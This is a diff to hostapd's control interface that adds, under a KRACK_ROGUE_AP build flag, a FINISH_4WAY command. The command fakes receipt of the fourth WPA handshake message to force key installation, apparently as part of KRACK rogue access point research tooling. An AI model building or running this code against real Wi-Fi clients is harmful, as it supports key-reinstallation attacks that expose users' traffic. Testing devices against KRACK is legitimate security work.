@@ -56,6 +56,7 @@
 #include "config_file.h"
 #include "ctrl_iface.h"
 
+#include "common/attacks.h"
 
 #define HOSTAPD_CLI_DUP_VALUE_MAX_LEN 256
 
@@ -70,6 +71,7 @@ static unsigned char gcookie[COOKIE_LEN];
 #endif /* CONFIG_CTRL_IFACE_UDP */
 
 int ieee802_11_mgmt(struct hostapd_data *hapd, const u8 *buf, size_t len, struct hostapd_frame_info *fi);
+void wpa_receive_msg4(struct wpa_authenticator *wpa_auth, struct wpa_state_machine *sm);
 
 static void hostapd_ctrl_iface_send(struct hostapd_data *hapd, int level,
 				    enum wpa_msg_type type,
@@ -1875,6 +1877,7 @@ static int hostapd_ctrl_get_fail(struct hostapd_data *hapd,
 
 #endif /* CONFIG_TESTING_OPTIONS */
 
+#ifdef KRACK_ROGUE_AP
 
 static int hostapd_ctrl_iface_rx_mgmt(struct hostapd_data *hapd, char *cmd)
 {
@@ -1910,6 +1913,36 @@ static int hostapd_ctrl_iface_rx_mgmt(struct hostapd_data *hapd, char *cmd)
 
 	return 0;
 }
+
+
+static int hostapd_ctrl_iface_finish_4way(struct hostapd_data *hapd, char *cmd)
+{
+	struct sta_info *sta;
+	u8 src[ETH_ALEN];
+	int used;
+
+	wpa_printf(MSG_DEBUG, "Finish 4-way handshake: %s", cmd);
+
+	used = hwaddr_aton2(cmd, src);
+	if (used < 0)
+		return -1;
+
+	// Get corresponding STA entry
+	sta = ap_get_sta(hapd, src);
+	if (!sta || (!(sta->flags & (WLAN_STA_ASSOC | WLAN_STA_PREAUTH)) &&
+		     !(hapd->iface->drv_flags & WPA_DRIVER_FLAGS_WIRED))) {
+		wpa_printf(MSG_DEBUG, "IEEE 802.1X data frame from not "
+			   "associated/Pre-authenticating STA");
+		return -1;
+	}
+
+	// Now fake reception of Msg4/4 to trigger installation of keys
+	wpa_receive_msg4(hapd->wpa_auth, sta->wpa_sm);
+
+	return 0;
+}
+
+#endif // KRACK_ROGUE_AP
 
 
 static int hostapd_ctrl_iface_chan_switch(struct hostapd_iface *iface,
@@ -2624,9 +2657,14 @@ static int hostapd_ctrl_iface_receive_process(struct hostapd_data *hapd,
 	} else if (os_strcmp(buf, "DRIVER_FLAGS") == 0) {
 		reply_len = hostapd_ctrl_driver_flags(hapd->iface, reply,
 						      reply_size);
+#ifdef KRACK_ROGUE_AP
 	} else if (os_strncmp(buf, "RX_MGMT ", 8) == 0) {
 		if (hostapd_ctrl_iface_rx_mgmt(hapd, buf + 8) < 0)
 			reply_len = -1;
+	} else if (os_strncmp(buf, "FINISH_4WAY ", 12) == 0) {
+		if (hostapd_ctrl_iface_finish_4way(hapd, buf + 12) < 0)
+			reply_len = -1;
+#endif
 	} else {
 		os_memcpy(reply, "UNKNOWN COMMAND\n", 16);
 		reply_len = 16;
